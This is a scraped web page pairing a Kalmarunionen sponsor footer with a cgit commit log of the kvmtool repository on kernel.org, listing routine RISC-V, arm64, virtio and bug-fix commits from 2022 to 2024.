Kalmarunionen is proudly sponsored by:

* Dubex
* ICSRange
* Industriens Fond
* JN Data
* VENZO
* CyberSkillsDK

![Kalmarunionen 2025](https://www.kalmarunionen.dk/icon/copy.svg)

Copyright  KALMARUNIONEN 2025. All Rights Reserved

[to-top](#documentTop)

=== Content from git.kernel.org_79ef68c7_20250114_215629.html ===


| [cgit logo](/) | [index](/) : [kernel/git/will/kvmtool.git](/pub/scm/linux/kernel/git/will/kvmtool.git/) | master |
| --- | --- | --- |
| Stand-alone kvmtool | Will Deacon |

| [about](/pub/scm/linux/kernel/git/will/kvmtool.git/about/)[summary](/pub/scm/linux/kernel/git/will/kvmtool.git/)[refs](/pub/scm/linux/kernel/git/will/kvmtool.git/refs/)[log](/pub/scm/linux/kernel/git/will/kvmtool.git/log/)[tree](/pub/scm/linux/kernel/git/will/kvmtool.git/tree/)[commit](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/)[diff](/pub/scm/linux/kernel/git/will/kvmtool.git/diff/)[stats](/pub/scm/linux/kernel/git/will/kvmtool.git/stats/) | log msg author committer range |
| --- | --- |

| Age | Commit message ([Expand](/pub/scm/linux/kernel/git/will/kvmtool.git/log/?showmsg=1)) | Author | Files | Lines |
| --- | --- | --- | --- | --- |
| 2024-12-11 | [Reset all VCPUs before any entering run loops](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6d754d01fe2cb366f3b636d8a530f46ccf3b10d8)[HEAD](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6d754d01fe2cb366f3b636d8a530f46ccf3b10d8)[master](/pub/scm/linux/kernel/git/will/kvmtool.git/log/) | Keir Fraser | 1 | -2/+1 |
| 2024-12-11 | [arm64: Increase the payload memory region size to 512MB](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9b26a8e2c57f4060e65baaffc82c7d6d48867eef) | Alexandru Elisei | 4 | -4/+17 |
| 2024-12-11 | [arm64: Use the kernel header image\_size when loading into memory](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=32345de5d89d106820ce74bf3c34e61eedbf11ca) | Alexandru Elisei | 4 | -24/+78 |
| 2024-12-11 | [arm: Check return value for host\_to\_guest\_flat()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=ca57fb69840b2016bbb8852690ace583ff487408) | Alexandru Elisei | 1 | -2/+10 |
| 2024-12-11 | [arm: Fix off-by-one errors when computing payload memory layout](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=167aa1eb072196a90f563210a6cf7570dee1067c) | Alexandru Elisei | 1 | -2/+2 |
| 2024-12-11 | [builtin-run: Allow octal and hex numbers for -m/--mem](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=2be69d9d4ae32a1c68ebf5f6b3ca733571da0dd5) | Alexandru Elisei | 1 | -1/+1 |
| 2024-11-11 | [riscv: Pass correct size to snprintf()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=574bd7b432ec0dd71b719f05094e12108194da12) | Björn Töpel | 1 | -1/+1 |
| 2024-10-23 | [riscv: Add Zimop extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3040b298156e4e2a82b27ac8db5bd63a72b3785b) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [riscv: Add Zcmop extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=1f0e5ba9e4583974ceca752cd3ca28a94a7b647f) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [riscv: Add Zcf extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9f50870b2701cbd03ecf2fbee89747f5e3ba4bdc) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [riscv: Add Zcd extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=80d2e0cd1496aa3098415a56e3a3a28cede343ab) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [riscv: Add Zcb extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=78bafd5691be6726822384c34e0213ccd02def06) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [riscv: Add Zca extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=4b8b352b0c258131acb6933b9d00dfa1f9c5aa71) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [riscv: Add Zawrs extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=c7a4bd93833f30fe660a20160e028790d21f7453) | Anup Patel | 2 | -0/+4 |
| 2024-10-23 | [Sync-up headers with Linux-6.11 kernel](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b862ed4bbe34ad046ac4de15f62be2c2277f2e0f) | Anup Patel | 4 | -1/+85 |
| 2024-08-30 | [disk/core: Fix memory leakage in open all disks](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b48735e5d562eaffb96cf98a91da212176f1534c) | leixiang | 1 | -5/+12 |
| 2024-08-30 | [riscv: Correct number of hart bits](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=100fade1ac13f242d6fce9a3a7eab3f1f92f144b) | Andrew Jones | 1 | -1/+1 |
| 2024-08-30 | [riscv: Set SBI\_SUCCESS on successful DBCN call](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=027784f4c67ecf3c9480cf92ee19d44c6a7a63c3) | Andrew Jones | 1 | -0/+1 |
| 2024-08-30 | [riscv: Add Sscofpmf extensiona support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=fa958fb68cfbab62b798ec7fe78b150a2dfafaf8) | Atish Patra | 2 | -0/+4 |
| 2024-08-30 | [Sync-up headers with Linux-6.10 kernel](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=01171537bcc043c80b0099933c1cbe01d627a0f1) | Anup Patel | 4 | -4/+166 |
| 2024-08-05 | [remove wordsize.h inclusion (for musl compatibility)](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=0592f8f829c843ff5cb2d108c309e32f4f6f5379) | Andre Przywara | 1 | -4/+2 |
| 2024-07-05 | [arm64: Allow the user to select the max SVE vector length](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=ca31abf5d9c3453c852b263ccb451751b29b944b) | Oliver Upton | 3 | -9/+65 |
| 2024-07-05 | [riscv: Add Zacas extensiona support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=32f810364df085850b8e2cd0515606cfe70c64bf) | Anup Patel | 2 | -0/+4 |
| 2024-07-05 | [riscv: Add Ztso extensiona support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=a20adc64b4ea5dfb8c6ef9cec296830590b0950b) | Anup Patel | 2 | -0/+4 |
| 2024-07-05 | [Sync-up headers with Linux-6.9 kernel](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=85aaadf64649698c3eb2cfbc8df81d0880141744) | Anup Patel | 8 | -707/+376 |
| 2024-04-09 | [x86: Fix some memory sizes when setting up bios](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=da4cfc3e540341b84c4bbad705b5a15865bc1f80) | Sicheng Liu | 2 | -6/+9 |
| 2024-04-09 | [riscv: Allow disabling SBI STA extension for Guest](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d38c8f76ebe20c94329cb75aeb21eb061e975798) | Anup Patel | 1 | -1/+4 |
| 2024-04-09 | [riscv: Add Zfa extensiona support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9cf213d609bcf7958325efacd97ca07e2bffe11a) | Anup Patel | 2 | -0/+4 |
| 2024-04-09 | [riscv: Add Zvfh[min] extensions support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=5a64c1eadf79826853f3dad92c69f9d690151e11) | Anup Patel | 2 | -0/+8 |
| 2024-04-09 | [riscv: Add Zihintntl extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=fce2865286b5a44dd8ea6a5d37b3c3e8c98545c3) | Anup Patel | 2 | -0/+4 |
| 2024-04-09 | [riscv: Add Zfh[min] extensions support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=bd7f13c1a19fb6386724a9c12814850f21f7db08) | Anup Patel | 2 | -0/+8 |
| 2024-04-09 | [riscv: Add vector crypto extensions support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=65b58f723ec3898a36a37a60449b2cad22360fa5) | Anup Patel | 2 | -0/+40 |
| 2024-04-09 | [riscv: Add scalar crypto extensions support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d9052a965a22a3a2b96668222e384fb5d1747664) | Anup Patel | 4 | -0/+88 |
| 2024-04-09 | [riscv: Add Zbc extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8b4cc7051393bddb1939c6636da91fb17cf1e39e) | Anup Patel | 2 | -0/+4 |
| 2024-04-09 | [kvmtool: Fix absence of \_\_packed definition](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=f8c9614c4696ac6df435e5ac63381ec558527369) | Anup Patel | 1 | -0/+2 |
| 2024-04-09 | [Sync-up headers with Linux-6.8 for KVM RISC-V](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9968468141fc441d2bc9891ea59ae09eb1e358bf) | Anup Patel | 5 | -91/+168 |
| 2024-03-04 | [Fix 9pfs open device file security flaw](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=4d2c017f41533b0e51e00f689050c26190a15318) | Yanwu Shen | 1 | -1/+12 |
| 2024-02-09 | [x86: Enable in-kernel irqchip before creating PIT](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=e73a6b29f1ebf30c44f59a0a228ebed70aa76586) | Tengfei Yu | 1 | -4/+4 |
| 2024-02-09 | [riscv: Fix guest poweroff when using PLIC emulation](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=f6cc06d6b53540b0c8d9eada04fb6c5bd90e56fd) | Anup Patel | 1 | -0/+32 |
| 2024-02-09 | [riscv: Handle SBI DBCN calls from Guest/VM](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=4ddaa4249e0c59a9ef6e09c1e32b042dd01e4c08) | Anup Patel | 3 | -3/+73 |
| 2024-02-09 | [riscv: Set mmu-type DT property based on satp\_mode ONE\_REG interface](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=ef89838e376037602eab589382520bb0a76e9cbb) | Anup Patel | 1 | -7/+37 |
| 2024-02-09 | [riscv: Add Zicond extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8cd71ca57fb01ad880524496bfed06d3ae421ea3) | Anup Patel | 2 | -0/+4 |
| 2024-02-09 | [riscv: Add Smstateen extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8d02d5a895c30d679d2ec0f235a98ee324972cef) | Anup Patel | 2 | -0/+4 |
| 2024-02-09 | [riscv: Add Zicsr and Zifencei extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3436684940bc4359d5aed6c28992f5af91448929) | Anup Patel | 2 | -0/+8 |
| 2024-02-09 | [riscv: Add Zicntr and Zihpm extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=667685691c5dc9a4144feb008ebff71d5f7b1e68) | Anup Patel | 2 | -0/+8 |
| 2024-02-09 | [riscv: Add Zba and Zbs extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6331850d6bc0a791b9ad8a03920ae8509fa0a977) | Anup Patel | 2 | -0/+8 |
| 2024-02-09 | [riscv: Make CPU\_ISA\_MAX\_LEN depend upon isa\_info\_arr array size](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=7887b3989ac22f362b755fa96f9e8318f4dc020e) | Anup Patel | 1 | -1/+1 |
| 2024-02-09 | [riscv: Improve warning in generate\_cpu\_nodes()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=fcb076756ab2dae13684e89d3fc9ce551c3e2d38) | Anup Patel | 1 | -1/+2 |
| 2024-02-09 | [Sync kernel headers with v6.7 to enable additional Risc-V extensions](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=92ef2dcd2c095420b73e04a1cabbddf8e246834d) | Will Deacon | 5 | -0/+71 |
| 2023-11-21 | [riscv: Fix guest/init linkage for multilib toolchain](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=095773e707ae1509f5bca0ad82f4e510e2ecdf80) | Anup Patel | 1 | -0/+2 |
| 2023-11-21 | [riscv: Use AIA in-kernel irqchip whenever KVM RISC-V supports](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=328f0879eeaee9ac167e3d00e4a9b5553e99d2f9) | Anup Patel | 5 | -6/+251 |
| 2023-11-21 | [riscv: Add IRQFD support for in-kernel AIA irqchip](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=17aab306ad146d051646953e24ff044d830617e7) | Anup Patel | 2 | -0/+84 |
| 2023-11-21 | [riscv: Make irqchip support pluggable](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=0dff350174f8da2b65dd43a3e569e5377f4ee906) | Anup Patel | 6 | -49/+147 |
| 2023-11-21 | [riscv: Add Svnapot extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=56e2d678f578ae2ae093dd623ff1a76c1b9dde94) | Anup Patel | 2 | -0/+4 |
| 2023-11-21 | [Sync-up header with Linux-6.6 for KVM RISC-V](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=26c85896bc3ad53e695e84772db08c34e6cd3c31) | Anup Patel | 3 | -4/+126 |
| 2023-11-21 | [virtio: Cancel and join threads when exiting devices devices](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=74af1456dfa0c3fb1c79529450c6130b54fd1c83) | Eduardo Bart | 9 | -1/+47 |
| 2023-09-18 | [pci: Deregister KVM\_PCI\_CFG\_AREA on pci\_\_exit](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9cb1b46cb765972326a46bdba867d441a842af56) | Tan En De | 1 | -0/+1 |
| 2023-09-18 | [virtio/pci: Use consistent naming for the PCI ISR bit flags](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d560235f45568a08c6006c2e1bd25399f8e9fea8) | Keir Fraser | 2 | -2/+5 |
| 2023-09-18 | [virtio/pci: Treat PCI ISR as a set of bit flags](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=2921448450005c6734bffc533cc71685aa9e296c) | Keir Fraser | 1 | -2/+2 |
| 2023-09-18 | [virtio/pci: Level-trigger the legacy IRQ line in all cases](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=353fa0d89e295ecf6717586533b81d5229cb2f4b) | Keir Fraser | 1 | -1/+1 |
| 2023-09-18 | [builtin-run: Document mode=none for -n/--network](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=c7b7a542cdcd8ebe55cc3e7b49cabba15725c2ca) | Alexandru Elisei | 1 | -1/+2 |
| 2023-09-18 | [Revert "virtio-net: Don't print the compat warning for the default device"](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=4498eb7400c6a6289b71be9e8f90e56c6a36271e) | Alexandru Elisei | 1 | -4/+4 |
| 2023-07-20 | [riscv: Fix guest RAM alloc size computation for RV32](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=106e2ea7756d980454d68631b87d5e25ba4e4881) | Anup Patel | 1 | -3/+12 |
| 2023-07-20 | [riscv: Add Ssaia extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8659200f69310e1f0e9cea70ae0fd65b363f6c4e) | Anup Patel | 2 | -0/+4 |
| 2023-07-20 | [riscv: Add Zicboz extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8f1e47ca04c993303013127407ce68e35ec38c08) | Andrew Jones | 2 | -1/+14 |
| 2023-07-20 | [riscv: Add zbb extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8c1584e776a48d5dc2343e1a5d8d3b44883d9f63) | Anup Patel | 2 | -0/+4 |
| 2023-07-20 | [riscv: Sort the ISA extension array alphabetically](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b346fabe6d2c4cc8e926fd0a0bbc7bc1758963e6) | Anup Patel | 1 | -2/+3 |
| 2023-07-20 | [riscv: Allow disabling SBI extensions for Guest](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=a416fdc2e664b8b8faf653fec636f93c187d2529) | Anup Patel | 3 | -9/+59 |
| 2023-07-20 | [riscv: Allow setting custom mvendorid, marchid, and mimpid](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9e9cfde59dfe291f7cb86782ba1a5eb90aecef9b) | Anup Patel | 2 | -1/+37 |
| 2023-07-20 | [Sync-up headers with Linux-6.4](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=be98682486a0920b9cecb0aa9bbdca6bc3ecb146) | Anup Patel | 7 | -31/+286 |
| 2023-07-20 | [kvm tools: Add \_\_DECLARE\_FLEX\_ARRAY() in include/linux/stddef.h](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d8343698df72d03986efc4b985b2ee18df514200) | Anup Patel | 1 | -0/+16 |
| 2023-07-20 | [virtio-net: Don't print the compat warning for the default device](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=15757e8e6441d83757c39046a6cdd3e4d74200ce) | Alexandru Elisei | 1 | -4/+4 |
| 2023-07-20 | [Apply scaling down the calculated guest ram size to the number of pages](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=63643b11ce7d7c36d0b4e7636a48ca8451c2aae7) | Fuad Tabba | 1 | -8/+6 |
| 2023-07-20 | [Factor out getting the number of physical memory host pages](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=834e5ed62fb8e4905b31e54d456d4011365b9533) | Fuad Tabba | 1 | -4/+10 |
| 2023-07-20 | [Factor out getting the host page size](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b6bae725decc42a4b5bc76058afb4c9d6abe4645) | Fuad Tabba | 1 | -7/+13 |
| 2023-07-12 | [Add --loglevel argument for the run command](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=bd4ba57156dad39349edfb2338bdc2f4ed3c0bae) | Alexandru Elisei | 3 | -6/+44 |
| 2023-07-12 | [util: Use \_\_pr\_debug() instead of pr\_info() to print debug messages](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=fc184a682a2164c156655ec18bc4a18bb638f644) | Alexandru Elisei | 2 | -1/+17 |
| 2023-07-12 | [Replace printf/fprintf with pr\_\* macros](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=72e13944777a6c60fbcd78ef97e06ffd00969d77) | Alexandru Elisei | 6 | -37/+37 |
| 2023-07-12 | [util: Make pr\_err() return void](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=2cc4929cc6b9a382a0c866cf5bbe849e3c0ec271) | Alexandru Elisei | 3 | -15/+18 |
| 2023-07-06 | [vfio/pci: Clarify the MSI states](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=0b5e55fc032d1c6394b8ec7fe02d842813c903df) | Jean-Philippe Brucker | 2 | -37/+57 |
| 2023-07-06 | [vfio/pci: Initialize MSI vectors unmasked](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3a36d3410e993094575e7bb5c387a297856cfb1c) | Jean-Philippe Brucker | 1 | -1/+1 |
| 2023-06-08 | [virtio/vhost: Clear VIRTIO\_F\_ACCESS\_PLATFORM](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3b1cdcf9e78f7d36f0cca805c4172bba53779b69) | Jean-Philippe Brucker | 5 | -14/+19 |
| 2023-06-08 | [virtio/vhost: Support line interrupt signaling](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=46aaf3b87d7ede27d5d6dd0e7da0574d9ab913b8) | Jean-Philippe Brucker | 6 | -22/+104 |
| 2023-06-08 | [Factor epoll thread](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=d30d94872e7fe998bd527e5cc6c38db58d46ee03) | Jean-Philippe Brucker | 5 | -155/+151 |
| 2023-06-08 | [virtio/net: Warn about enabling multiqueue with vhost](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3a70ab1e7bb3b0ec773fcc95020bf95cab763fdf) | Jean-Philippe Brucker | 1 | -0/+5 |
| 2023-06-08 | [virtio: Fix messages about missing Linux config](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=33e026a78c9f6760bf809d5b01369aaed2f627ee) | Jean-Philippe Brucker | 2 | -2/+2 |
| 2023-06-08 | [virtio: Document how to test the devices](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=13534ee80ce3daf355429bade1f935078e239f01) | Jean-Philippe Brucker | 1 | -0/+141 |
| 2023-06-08 | [virtio/net: Fix feature selection](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=53171d59b081aa7176b1fab2e78ba61fb54c8ab3) | Jean-Philippe Brucker | 1 | -10/+12 |
| 2023-06-08 | [virtio/vsock: Fix feature selection](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=cf8358d34f3157e1a891ad00a9959870b65a1861) | Jean-Philippe Brucker | 1 | -14/+20 |
| 2023-06-08 | [virtio/scsi: Fix feature selection](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=13ea439a1f48a19cc31e5c39abb8079aa8deedef) | Jean-Philippe Brucker | 1 | -14/+19 |
| 2023-06-08 | [virtio/scsi: Initialize max\_target](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b8420e8d5d8dd74c7efd86d4ed7df724127fe184) | Jean-Philippe Brucker | 1 | -0/+1 |
| 2023-06-08 | [disk/core: Fix segfault on exit with SCSI](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=7bc3b5d7ef8070f91d3139f65030bb3a6aece10f) | Jean-Philippe Brucker | 1 | -2/+2 |
| 2023-06-08 | [virtio/scsi: Fix and simplify command-line](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=145a86fedfe8321e857e1370a42b2a24b0bcda2c) | Jean-Philippe Brucker | 3 | -14/+6 |
| 2023-06-08 | [virtio/scsi: Move VHOST\_SCSI\_SET\_ENDPOINT to device start](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=13e7d626e00fb723b9f469b7b5bc12193dba9835) | Jean-Philippe Brucker | 1 | -8/+7 |
| 2023-06-08 | [virtio/vhost: Factor notify\_vq\_gsi()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=029cd2bb789837641aad4b43b6370ff0fecfca28) | Jean-Philippe Brucker | 5 | -63/+53 |
| 2023-06-08 | [virtio/vhost: Factor notify\_vq\_eventfd()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=676c0c8ad95bff2f1aa77f2899aa9ee13f66c7a1) | Jean-Philippe Brucker | 5 | -28/+20 |
| 2023-06-08 | [virtio/vhost: Factor vring operation](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=745221e582f7c81ff2911599d2620ac541d0f671) | Jean-Philippe Brucker | 5 | -76/+38 |
| 2023-06-08 | [virtio: Factor vhost initialization](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=f84ab9eb74fcd7db332c5b915c7d60cae44f8958) | Jean-Philippe Brucker | 6 | -75/+42 |
| 2023-06-08 | [virtio/rng: Fix build warning from min()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=53114134ce5a1fb2468fdf7d667e42ad0ea98229) | Jean-Philippe Brucker | 1 | -1/+1 |
| 2023-06-08 | [arm/kvm-cpu: Fix new build warning](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=426e875213d36a1ff30c5599c2efd3023eadcba6) | Jean-Philippe Brucker | 1 | -2/+1 |
| 2023-06-08 | [Makefile: Refine -s handling in the make parameters](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8f6cabb25d79c1a20e7fdf021339d200e9c901b7) | Jean-Philippe Brucker | 1 | -1/+1 |
| 2023-06-05 | [virtio: sanitise virtio endian wrappers](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b17552ee6c9728c20c9d0bd037ef134277daaa40) | Andre Przywara | 7 | -61/+71 |
| 2023-06-05 | [option parsing: fix type of empty .argh parameter](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=c1eecc61558d062b5195641dc977e098c08efe2e) | Andre Przywara | 3 | -5/+6 |
| 2023-06-05 | [virtio/rng: return at least one byte of entropy](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=bc23b9d9b152eaf56bacb1e2bae9a2b2252ade46) | Andre Przywara | 1 | -3/+15 |
| 2023-06-05 | [virtio/rng: switch to using /dev/urandom](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=62ba372b0e67b92efe20f63330fa0d40004d9fdd) | Andre Przywara | 1 | -1/+1 |
| 2023-04-06 | [arm: Do not add padding alignment for hugetlbfs backed memory](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=77b108c6a6f1c66fb7f60a80d17596bb80bda8ad) | Suzuki K Poulose | 1 | -1/+3 |
| 2023-03-24 | [Add virtio-transport option and deprecate force-pci and virtio-legacy.](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9b46ebc561d3cc3bb54a350e4eed94d24562f347) | Rajnesh Kanwal | 16 | -30/+61 |
| 2023-03-24 | [riscv: Move serial and rtc from IO port space to MMIO area.](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=2f030d283c0e7a417f50cf0d70d076870815f3e6) | Rajnesh Kanwal | 3 | -1/+14 |
| 2022-11-08 | [riscv: Add --disable-<xyz> options to allow user disable extensions](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=e17d182ad3f797f01947fc234d95c96c050c534b) | Anup Patel | 2 | -1/+25 |
| 2022-11-08 | [riscv: Add Zicbom extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=798398f40a163d476ec142b57e35bc1de4f17ca0) | Andrew Jones | 1 | -0/+11 |
| 2022-11-08 | [riscv: Move reg encoding helpers to kvm-cpu-arch.h](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=b721ac0ad88a828890a7e44aa7889675152997eb) | Andrew Jones | 3 | -18/+19 |
| 2022-11-08 | [riscv: Add zihintpause extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=23a8ed9073310d6aa06930cf65820cd2ccab2037) | Mayuresh Chitale | 1 | -0/+1 |
| 2022-11-08 | [riscv: Add Svinval extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=ac16e9430627c8f502b949c569de03ddabac5821) | Anup Patel | 1 | -0/+1 |
| 2022-11-08 | [Update UAPI headers based on Linux-6.1-rc1](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=76dfc0cf2d6bce6fedf53746cec3787c3b15847b) | Anup Patel | 6 | -14/+46 |
| 2022-11-08 | [hw/i8042: Fix value uninitialized in kbd\_io()](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=5a9cde6532ea2caf690a30d31da6c4ed658e3643) | hbuxiaofei | 1 | -1/+1 |
| 2022-11-08 | [pci: Disable writes to Status register](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=78771e779a3aca3f6d7ce7aff60ae0f835fbc14f) | Jean-Philippe Brucker | 1 | -14/+40 |
| 2022-10-04 | [virtio-net: Fix vq->use\_event\_idx flag check](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=717a3ab0a195626360f40e9d3b4d6d8e072e83ba) | Tu Dinh Ngoc | 1 | -1/+1 |
| 2022-09-22 | [riscv: Fix serial0 alias path](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=ed805be52f57934729379e0afd546b7433f7f987) | Anup Patel | 1 | -4/+8 |
| 2022-09-22 | [riscv: Add Sstc extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=3c07aeaf993a2ec607ff4e1f8b5b78d300c3c8f5) | Atish Patra | 1 | -0/+1 |
| 2022-09-22 | [riscv: Add Svpbmt extension support](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=2b4fe0f8cff1c7d16ed47016068ad19eedc90068) | Anup Patel | 1 | -0/+1 |
| 2022-09-22 | [riscv: Append ISA extensions to the device tree](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8aff29e1dafe888d00786574925765ea667fbb43) | Atish Patra | 3 | -11/+41 |
| 2022-09-22 | [Update UAPI headers based on Linux-6.0-rc1](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=8d0facec06aed40cc6affd3460dd8b52f621e7f2) | Anup Patel | 9 | -30/+301 |
| 2022-09-22 | [net: Use vfork() instead of fork() for script execution](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=9987a37cfc574bd90df9dbb6a1e08ac6b48c7cea) | Suzuki K Poulose | 1 | -1/+1 |
| 2022-08-04 | [Makefile: Introduce LIBFDT\_DIR to specify libfdt location](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=336751fb10ef24e65cd2f25c450da1d52ff5b33c) | Alexandru Elisei | 2 | -8/+33 |
| 2022-08-04 | [virtio/rng: Zero-initialize the device](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=6c88c26f701ffcd9534bb4bfdc6f3225d20c4921) | Jean-Philippe Brucker | 1 | -1/+1 |
| 2022-08-04 | [virtio/pci: Deassert IRQ line on ISR read](/pub/scm/linux/kernel/git/will/kvmtool.git/commit/?id=fe2182731b721ecaec97cb7f02b2c334469669ce) | Jean-Philippe Brucker | 1 | -4/+1 |
